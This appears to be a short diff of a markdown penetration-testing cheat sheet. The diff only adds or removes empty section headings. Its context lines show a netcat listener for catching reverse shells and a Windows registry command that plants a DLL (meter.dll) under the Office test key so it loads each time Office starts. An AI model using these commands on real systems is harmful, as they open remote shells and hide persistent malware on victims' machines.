@@ -7,6 +7,8 @@
 ## REVERSE
 * rlwrap -cAr nc -lnvp PORT
 
+# LATERAL
+
 # PERSISTANT
 
 ## LINUX
@@ -119,10 +121,6 @@
 * Office
 
     cmd$> reg add "HKCU\Software\Microsoft\Office test\Special\Perf" /t REG_SZ /d C:\users\username\meter.dll
-
-# OS
-
-# UTILS
 
 # LINKS
 
